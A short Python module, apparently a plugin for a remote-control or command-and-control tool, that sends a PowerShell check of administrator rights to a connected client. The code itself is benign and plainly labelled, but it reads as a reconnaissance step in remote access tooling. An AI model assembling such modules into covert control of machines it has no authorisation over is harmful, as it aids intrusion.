def execute(client_interaction_ui, client_id):
    """Check if running with admin privileges"""
    # PowerShell script to check admin rights
    admin_check = """
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    $adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
    
    if ($principal.IsInRole($adminRole)) {
        Write-Output "Running with administrator privileges!"
    } else {
        Write-Output "Not running with administrator privileges!"
    }
    """
    client_interaction_ui.send_command(admin_check)
    
def get_description():
    """Get command description"""
    return "Check if the client is running with administrative privileges"